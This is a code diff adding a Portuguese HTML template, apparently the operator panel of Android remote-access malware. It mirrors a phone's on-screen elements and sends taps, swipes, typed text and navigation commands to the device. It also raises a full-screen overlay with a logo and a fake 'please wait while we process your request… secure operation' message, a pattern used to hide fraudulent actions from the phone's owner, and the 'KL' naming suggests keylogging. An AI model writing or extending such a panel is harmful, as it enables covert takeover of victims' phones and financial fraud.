@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+
+<title>Dispositivo KL</title>
+
+<style>
+
+body {
+    font-family: Arial, sans-serif;
+    background:#f4f6f8;
+    padding:30px;
+}
+
+
+h1 {
+    color:#222;
+}
+
+
+.card {
+
+    background:white;
+    padding:20px;
+    border-radius:12px;
+    margin-bottom:20px;
+    box-shadow:0 2px 10px #0002;
+
+}
+
+
+
+/* ESPELHO */
+
+.area-espelho {
+
+    display:flex;
+    justify-content:center;
+    padding:20px;
+
+}
+
+
+
+.celular {
+
+    position:relative;
+
+    background:#111;
+
+    border-radius:35px;
+
+    overflow:hidden;
+
+    border:8px solid #222;
+    
+    cursor: crosshair;
+    
+    user-select: none;
+    -webkit-user-select: none;
+    -moz-user-select: none;
+
+}
+
+
+
+.elemento-espelho {
+
+    position:absolute;
+
+    overflow:hidden;
+
+    font-size:10px;
+
+    color:#111;
+
+    background:#ffffffaa;
+
+    border:1px solid #555;
+
+    padding:2px;
+
+}
+
+
+
+.elemento-espelho.botao {
+
+    background:#d9eaff;
+
+}
+
+
+
+.elemento-espelho.texto {
+
+    background:#ffffffcc;
+
+}
+
+
+
+
+
+.elemento {
+
+    background:#f5f5f5;
+
+    padding:15px;
+
+    margin-top:10px;
+
+    border-radius:10px;
+
+    border-left:5px solid #222;
+
+}
+
+
+
+.titulo {
+
+    font-weight:bold;
+
+    font-size:18px;
+
+}
+
+
+.vazio {
+
+    color:#777;
+
+}
+
+
+</style>
+
+
+</head>
+
+
+<body>
+
+
+
+<h1>Controle do Dispositivo</h1>
+
+
+
+<div class="card">
+
+
+<h2>{{ dispositivo.modelo }}</h2>
+
+
+<p>
+ID:
+{{ dispositivo.id }}
+</p>
+
+
+<p>
+Fabricante:
+{{ dispositivo.fabricante }}
+</p>
+
+
+<p>
+Android:
+{{ dispositivo.android }}
+</p>
+
+
+<p>
+Resolução:
+{{ dispositivo.largura }} x {{ dispositivo.altura }}
+</p>
+
+
+<p>
+Status:
+{{ dispositivo.status }}
+</p>
+
+
+</div>
+
+
+<!-- NOVO CARD DE CONTROLE ADICIONADO AQUI -->
+<div class="card">
+
+<h2>Controle</h2>
+
+<button onclick="enviarComando('voltar')">
+Voltar
+</button>
+
+<button onclick="enviarComando('inicio')">
+Início
+</button>
+
+<button onclick="enviarComando('recentes')">
+Recentes
+</button>
+
+<br><br>
+
+<input 
+id="textoEnviar"
+type="text"
+placeholder="Digite o texto"
+style="width:80%;padding:10px;"
+>
+
+<button onclick="enviarTexto()">
+Enviar Texto
+</button>
+
+</div>
+<!-- FIM DO NOVO CARD -->
+
+<div class="card">
+<h2>Controle Overlay</h2>
+<input id="logoOverlay" type="text" placeholder="logo.png" value="logo.png" style="width:100%;padding:10px;margin-bottom:8px;">
+<input id="mensagemOverlay" type="text" placeholder="Mensagem" value="Aguarde enquanto processamos sua solicitação..." style="width:100%;padding:10px;margin-bottom:8px;">
+<input id="textoInferiorOverlay" type="text" placeholder="Texto inferior" value="Operação segura" style="width:100%;padding:10px;margin-bottom:8px;">
+<button onclick="confirmarTextoOverlay()">Confirmar Texto</button>
+<button onclick="ativarOverlay()" style="background:#22c55e;color:#fff;">Ativar Overlay</button>
+<button onclick="desativarOverlay()" style="background:#ef4444;color:#fff;">Desativar Overlay</button>
+<p>Status: <span id="statusOverlay">Desativado</span></p>
+</div>
+
+<div class="card">
+
+
+<h2>ESPELHO KL</h2>
+
+
+<div class="area-espelho">
+
+
+<div
+id="celular"
+class="celular"
+onmousedown="inicioArrasto(event)"
+>
+
+</div>
+
+</div>
+
+
+</div>
+
+
+
+
+
+<div class="card">
+
+
+<h2>Esqueleto recebido</h2>
+
+
+<p>
+
+Total de elementos:
+
+<span id="total-elementos">
+0
+</span>
+
+
+</p>
+
+
+</div>
+
+
+
+
+
+<div class="card">
+
+
+<h2>Elementos da tela</h2>
+
+
+<div id="lista-elementos">
+
+
+<p class="vazio">
+Carregando elementos...
+</p>
+
+
+</div>
+
+
+</div>
+<script>
+
+
+const dispositivoId = "{{ dispositivo.id }}";
+
+const larguraOriginal = {{ dispositivo.largura }};
+const alturaOriginal = {{ dispositivo.altura }};
+
+
+const escala = 0.35;
+let escalaAtual = 1;
+
+async function enviarComando(comando){
+
+    try {
+
+        await fetch(
+            "/enviar_comando",
+            {
+                method:"POST",
+                headers:{
+                    "Content-Type":"application/json"
+                },
+                body: JSON.stringify({
+                    id: dispositivoId,
+                    comando: comando
+                })
+            }
+        );
+
+        console.log(
+            "Comando enviado:",
+            comando
+        );
+        
+    } catch(e){
+
+        console.log(
+            "Erro enviando comando:",
+            e
+        );
+
+    }
+
+}
+
+async function enviarTexto(){
+
+    const campo = document.getElementById("textoEnviar");
+
+    const texto = campo.value;
+
+    if(!texto){
+        return;
+    }
+
+
+    await enviarComando(
+        "texto|" + texto
+    );
+
+    campo.value = "";
+}
+
+async function confirmarTextoOverlay() {
+    const mensagem = document.getElementById("mensagemOverlay").value;
+    const textoInferior = document.getElementById("textoInferiorOverlay").value;
+    await fetch("/atualizar_overlay_texto", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ dispositivo: dispositivoId, mensagem, texto_inferior: textoInferior })
+    });
+    document.getElementById("statusOverlay").innerText = "Texto salvo";
+}
+
+async function ativarOverlay() {
+    await fetch("/salvar_overlay", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            dispositivo: dispositivoId,
+            logo: document.getElementById("logoOverlay").value,
+            mensagem: document.getElementById("mensagemOverlay").value,
+            texto_inferior: document.getElementById("textoInferiorOverlay").value
+        })
+    });
+    document.getElementById("statusOverlay").innerText = "Ativo";
+}
+
+async function desativarOverlay() {
+    await fetch("/desativar_overlay", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ dispositivo: dispositivoId })
+    });
+    document.getElementById("statusOverlay").innerText = "Desativado";
+}
+
+async function clicarElemento(x, y){
+
+    await enviarComando(
+        "toque|" + x + "," + y
+    );
+
+}
+
+function clicarEspelho(event){
+
+    if (foiArrasto) {
+        foiArrasto = false;
+        return;
+    }
+
+
+    const celular = document.getElementById("celular");
+
+    const rect = celular.getBoundingClientRect();
+
+
+    const x = Math.round(
+        (event.clientX - rect.left) / escala
+    );
+
+
+    const y = Math.round(
+        (event.clientY - rect.top) / escala
+    );
+
+
+    enviarComando(
+        "toque|" + x + "," + y
+    );
+
+}
+
+let foiArrasto = false;
+
+
+let inicioX = 0;
+let inicioY = 0;
+
+
+function coordenadasNoCelular(event) {
+    const celular = document.getElementById("celular");
+    const rect = celular.getBoundingClientRect();
+    const fator = escala * escalaAtual;
+    const x = (event.clientX - rect.left) / fator;
+    const y = (event.clientY - rect.top) / fator;
+    return {
+        x: Math.max(0, Math.min(larguraOriginal, Math.round(x))),
+        y: Math.max(0, Math.min(alturaOriginal, Math.round(y)))
+    };
+}
+
+function finalizarArrasto(event) {
+    document.removeEventListener("mouseup", finalizarArrasto);
+    document.removeEventListener("mousemove", marcarArrasto);
+
+    const { x: fimX, y: fimY } = coordenadasNoCelular(event);
+    const distanciaX = Math.abs(fimX - inicioX);
+    const distanciaY = Math.abs(fimY - inicioY);
+    const limiarArrasto = 12;
+
+    if (distanciaX >= limiarArrasto || distanciaY >= limiarArrasto) {
+        foiArrasto = true;
+        enviarComando(`arrastar|${inicioX},${inicioY},${fimX},${fimY}`);
+    } else {
+        enviarComando(`toque|${fimX},${fimY}`);
+    }
+}
+
+function marcarArrasto() {
+    foiArrasto = true;
+}
+
+function inicioArrasto(event) {
+    event.preventDefault();
+    foiArrasto = false;
+    const coords = coordenadasNoCelular(event);
+    inicioX = coords.x;
+    inicioY = coords.y;
+    document.addEventListener("mouseup", finalizarArrasto);
+    document.addEventListener("mousemove", marcarArrasto);
+}
+
+function obterTextoElemento(el) {
+    return el.rotulo || el.label || el.text || el.texto || el.descricao || el.dica || el.estado || el.viewId || el.recurso_id || "";
+}
+
+async function atualizarTela(){
+
+
+    try {
+
+
+        const resposta = await fetch(
+            "/api/esqueleto/" + dispositivoId
+        );
+
+
+        const dados = await resposta.json();
+
+
+        const elementos = dados.elementos || [];
+
+
+
+        document.getElementById(
+            "total-elementos"
+        ).innerText = elementos.length;
+
+
+
+        desenharEspelho(elementos);
+
+
+        desenharLista(elementos);
+
+
+
+    } catch(e) {
+
+
+        console.log(
+            "Erro atualização:",
+            e
+        );
+
+
+    }
+
+
+}
+
+
+
+
+function desenharEspelho(elementos){
+
+
+
+    const celular = document.getElementById(
+        "celular"
+    );
+
+
+
+    celular.style.width =
+        (larguraOriginal * escala) + "px";
+
+
+    celular.style.height =
+        (alturaOriginal * escala) + "px";
+
+
+
+    celular.innerHTML = "";
+
+
+
+
+    elementos.forEach(elemento => {
+
+
+
+        const div = document.createElement(
+            "div"
+        );
+
+
+
+        div.className =
+            "elemento-espelho";
+
+
+
+        if(elemento.tipo === "botao" || elemento.type === "botao"){
+            div.classList.add("botao");
+        }
+
+        if(elemento.tipo === "texto" || elemento.type === "texto"){
+            div.classList.add("texto");
+        }
+
+        if(elemento.tipo === "campo_texto" || elemento.type === "campo_texto"){
+            div.classList.add("campo");
+        }
+
+        if(elemento.cor){
+            div.style.borderColor = elemento.cor;
+            div.style.background = elemento.cor + "33";
+        }
+
+        div.style.left =
+            ((elemento.x || 0) * escala) + "px";
+
+        div.style.top =
+            ((elemento.y || 0) * escala) + "px";
+
+        div.style.width =
+            ((elemento.largura || elemento.width || 0) * escala) + "px";
+
+        div.style.height =
+            ((elemento.altura || elemento.height || 0) * escala) + "px";
+
+        div.innerText = obterTextoElemento(elemento);
+
+
+
+        celular.appendChild(div);
+
+
+
+    });
+
+
+
+}
+
+
+
+
+function desenharLista(elementos){
+
+
+    let html = "";
+
+
+
+    if(elementos.length === 0){
+
+
+        html = `
+
+        <p class="vazio">
+        Nenhum elemento encontrado.
+        </p>
+
+        `;
+
+
+    } else {
+
+
+
+        elementos.forEach(elemento => {
+
+
+
+            html += `
+
+
+            <div class="elemento">
+
+
+            <p class="titulo">
+            ${elemento.tipo}
+            </p>
+
+
+
+            <p>
+            Texto:
+            ${obterTextoElemento(elemento)}
+            </p>
+
+
+
+            <p>
+            Posição:
+            X ${elemento.x}
+            |
+            Y ${elemento.y}
+            </p>
+
+
+
+            <p>
+            Tamanho:
+            ${elemento.largura}
+            x
+            ${elemento.altura}
+            </p>
+
+            <button onclick="clicarElemento(${elemento.x}, ${elemento.y})">
+Clicar
+</button>
+            
+            </div>
+
+
+            `;
+
+
+
+        });
+
+
+
+    }
+
+
+
+    document.getElementById(
+        "lista-elementos"
+    ).innerHTML = html;
+
+
+
+}
+
+
+
+
+atualizarTela();
+
+
+
+setInterval(
+    atualizarTela,
+    1000
+);
+
+
+
+</script>
+
+
+</body>
+
+</html>
